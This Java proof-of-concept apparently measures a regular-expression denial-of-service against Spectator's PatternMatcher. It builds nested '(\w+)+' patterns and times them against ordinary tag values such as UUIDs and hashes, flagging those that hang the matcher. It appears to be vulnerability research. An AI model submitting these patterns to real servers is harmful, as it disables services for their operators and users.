import com.netflix.spectator.impl.PatternMatcher;

/**
 * Can an attacker wedge the server WITHOUT knowing or planting any data? The pattern does not
 * reference the value at all: it just has to be applied to some long word-character tag value
 * that the victim's index already contains.
 */
public final class BlindAttack {
  private static long cost(String pattern, String value, long budgetMs) {
    PatternMatcher m;
    try {
      m = PatternMatcher.compile(pattern);
    } catch (Throwable t) {
      return -2;
    }
    final long[] out = {-1};
    Thread t = new Thread(() -> {
      long t0 = System.nanoTime();
      try {
        m.matches(value);
      } catch (Throwable ignored) {
        // ignore
      }
      out[0] = (System.nanoTime() - t0) / 1_000_000;
    });
    t.setDaemon(true);
    t.start();
    try {
      t.join(budgetMs);
    } catch (InterruptedException e) {
      Thread.currentThread().interrupt();
    }
    return t.isAlive() ? -1 : out[0];
  }

  private static String rep(String s, int times) {
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < times; i++) {
      sb.append(s);
    }
    return sb.toString();
  }

  public static void main(String[] args) {
    // values that a real metrics index contains without any attacker involvement
    String[][] victims = {
      {"uuid 36", "3f2504e0-4f89-11d3-9a0c-0305e82c3301"},
      {"sha1 40", rep("a3f5c9d1e7b8024612", 2)},
      {"sha256 64", rep("a3f5c9d1e7b80246", 4)},
      {"md5 32", rep("a3f5c9d1e7b8024612", 2).substring(0, 32)},
      {"cluster 40", "checkout-service-v2-prod-us-east-1-a"}
    };
    for (int groups = 4; groups <= 8; groups++) {
      StringBuilder p = new StringBuilder();
      for (int g = 0; g < groups; g++) {
        p.append("(\\w+)+");
      }
      p.append("x");
      System.out.println("pattern (" + groups + " groups, len " + p.length() + "): " + p);
      for (String[] v : victims) {
        long ms = cost(p.toString(), v[1], 20000);
        System.out.printf("   %-11s len=%-3d %s%n", v[0], v[1].length(),
            ms == -2 ? "SKIP" : ms < 0 ? ">20000 ms  <-- WEDGES" : ms + " ms");
      }
      System.out.println();
    }
  }
}
